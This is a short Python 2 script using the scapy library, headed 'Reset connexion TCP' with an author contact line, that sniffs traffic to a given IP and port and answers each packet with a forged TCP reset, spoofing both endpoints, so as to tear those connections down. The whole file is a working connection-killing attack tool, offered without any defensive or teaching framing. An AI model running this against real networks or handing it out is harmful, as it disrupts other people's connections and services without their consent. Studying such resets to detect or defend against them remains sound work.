#Reset connexion TCP
#contact : lionel.prat9@gmail.com
from scapy.all import *
import sys

def rst_callback(pkt):
    send(IP(dst = pkt[IP].src,src = pkt[IP].dst)/TCP(sport = pkt[TCP].dport,dport = pkt[TCP].sport, flags = 'R', seq = pkt[TCP].ack))
    return pkt.sprintf("%pkt[IP].src% %pkt[IP].dst%")
        
if __name__ == '__main__':
    if len(sys.argv) < 3:
        print 'Syntaxe : /.py IP PRT_DST'
        exit(0)
    IPX = sys.argv[1]
    PRT = sys.argv[2]
    sniff(prn=rst_callback, filter="tcp and host " + IPX + " and port " + PRT, store=0)

